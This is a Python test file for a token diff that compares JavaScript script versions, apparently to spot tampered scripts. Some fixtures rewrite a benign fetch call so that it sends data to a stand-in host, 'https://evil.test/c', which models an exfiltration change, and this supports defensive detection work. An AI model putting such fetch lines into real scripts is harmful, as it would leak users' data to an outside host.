"""The token diff between script versions."""

from __future__ import annotations

import random

from script_sentinel import diff
from script_sentinel.diff import Hunk, diff_sources, render, render_hunks, similarity


def test_identical_and_comment_only_changes_have_no_hunks() -> None:
    assert diff_sources("a(1);", "a(1);").identical
    result = diff_sources("/*! v1 */\nfoo(1);   // x", "/*! v2 build 7 */\n\n  foo(1);")
    assert result.identical
    assert result.similarity == 1.0
    assert render(result) == ""
    assert diff_sources("", "").similarity == 1.0


def test_one_token_change_with_context_and_lines() -> None:
    old = 'var a = 1;\nfetch("/api", {body: a});\nwindow.x = 2;\n'
    new = 'var a = 1;\nfetch("https://evil.test/c", {body: a});\nwindow.x = 2;\n'
    result = diff_sources(old, new)
    assert (result.removed, result.added) == (1, 1)
    [hunk] = result.hunks
    assert (hunk.old_line, hunk.new_line) == (2, 2)
    assert (hunk.removed, hunk.added) == ('"/api"', '"https://evil.test/c"')
    assert hunk.before == "a = 1 ;\nfetch ("
    assert hunk.after == ", { body : a }"  # CONTEXT_TOKENS tokens
    assert result.similarity == round(1 - 2 / (result.old_tokens + result.new_tokens), 4)
    assert render(result).splitlines() == [
        "@@ line 2 -> line 2 @@",
        "  … a = 1 ; fetch (",
        '- "/api"',
        '+ "https://evil.test/c"',
        "  , { body : a } …",
    ]


def test_pure_insertions_and_deletions() -> None:
    inserted = diff_sources("a();", "a();b();")
    assert [(h.removed, h.added) for h in inserted.hunks] == [("", "b ( ) ;")]
    assert (inserted.removed, inserted.added) == (0, 4)
    deleted = diff_sources("a();b();", "a();")
    assert [(h.removed, h.added) for h in deleted.hunks] == [("b ( ) ;", "")]
    # A change at the very end: the new line number points past the old text.
    appended = diff_sources("a();\n", "a();\nb();\n")
    assert appended.hunks[0].old_line == 2
    assert appended.hunks[0].new_line == 2


def test_line_numbers_follow_every_line_terminator() -> None:
    old = "a;\r\nb;\rc;\u2028d;\u2029e;"
    new = "a;\r\nb;\rc;\u2028d;\u2029f;"
    assert diff_sources(old, new).hunks[0].old_line == 5


def test_long_hunks_are_truncated() -> None:
    big = "x(" + ", ".join(str(i) for i in range(2000)) + ");"
    result = diff_sources("x();", big)
    [hunk] = result.hunks
    assert hunk.truncated
    assert hunk.added.endswith(" …")
    assert len(hunk.added) == diff.MAX_HUNK_TEXT + 2
    assert hunk.added_tokens == result.added


def test_render_limits_hunks() -> None:
    result = diff_sources("a(1); b(2); c(3);", "a(9); b(8); c(7);")
    assert len(result.hunks) == 3
    text = render(result, max_hunks=1)
    assert text.splitlines()[-1] == "… 2 more hunk(s)"
    assert render_hunks(result.hunks[:1], total=5).endswith("… 4 more hunk(s)")
    restored = [Hunk.from_dict(h.to_dict()) for h in result.hunks]
    assert restored == result.hunks


def _bundle(count: int, seed: int = 1) -> list[str]:
    rng = random.Random(seed)
    return [
        f"function f{i}(a,b){{return a.x{i % 50}+b[{i}]*{rng.randint(0, 999)};}}"
        for i in range(count)
    ]


def test_large_middles_use_patience_alignment() -> None:
    parts = _bundle(400)
    old = "".join(parts)
    edited = list(parts)
    edited[100] = edited[100].replace("return a.x0", 'return fetch("https://evil.test/")')
    edited[300] = edited[300].replace("function f300(a,b)", "function f300(a,b,c)")
    new = "".join(edited)
    exact = diff_sources(old, new)
    patience = diff_sources(old, new, token_budget=10)
    assert not patience.coarse
    assert [(h.removed, h.added) for h in patience.hunks] == [
        (h.removed, h.added) for h in exact.hunks
    ]
    assert len(patience.hunks) == 2
    assert '"https://evil.test/"' in patience.hunks[0].added


def test_the_budget_bounds_work_and_marks_coarse_results() -> None:
    parts = _bundle(300)
    shuffled = list(parts)
    random.Random(2).shuffle(shuffled)
    # Ranges without unique tokens fall back to SequenceMatcher while the budget lasts...
    loose = diff_sources("".join(parts), "".join(shuffled), token_budget=50_000)
    # ...and are reported whole after that.
    tight = diff_sources("".join(parts), "".join(shuffled), token_budget=1)
    assert tight.coarse
    assert tight.similarity <= loose.similarity
    # Whatever the budget, the hunks account for every changed token.
    for result in (loose, tight):
        assert sum(h.removed_tokens for h in result.hunks) == result.removed
        assert sum(h.added_tokens for h in result.hunks) == result.added


def test_patience_with_repeated_tokens_only() -> None:
    # No token is unique, so the alignment comes from SequenceMatcher alone.
    old = "a;a;a;b;b;a;a;" * 3
    new = "a;a;b;a;b;a;a;" * 3
    result = diff_sources(old, new, token_budget=2)
    assert not result.identical
    assert diff_sources(old, new, token_budget=10_000).similarity >= result.similarity


def test_lis_keeps_the_longest_increasing_run() -> None:
    pairs = [(0, 3), (1, 1), (2, 2), (3, 0), (4, 4)]
    assert diff._lis(pairs) == [(1, 1), (2, 2), (4, 4)]
    assert diff._lis([]) == []


def test_similarity() -> None:
    assert similarity("a(1);", "a(1); // same") == 1.0
    assert similarity("", "a();") == 0.0
    assert similarity("var a = 1; b(a); c(a);", "var a = 2; b(a); c(a);") > 0.8
    assert similarity("a.b.c.d.e.f.g.h", "x(1,2,3,4,5,6,7)") == 0.0
    big = "x();" * 10
    assert similarity(big, big + "y();", max_tokens=5) == 0.0


def test_render_skips_empty_parts() -> None:
    assert render(diff_sources("", "a();")).splitlines() == ["@@ line 1 -> line 1 @@", "+ a ( ) ;"]
    assert render(diff_sources("a();", "")).splitlines() == ["@@ line 1 -> line 1 @@", "- a ( ) ;"]
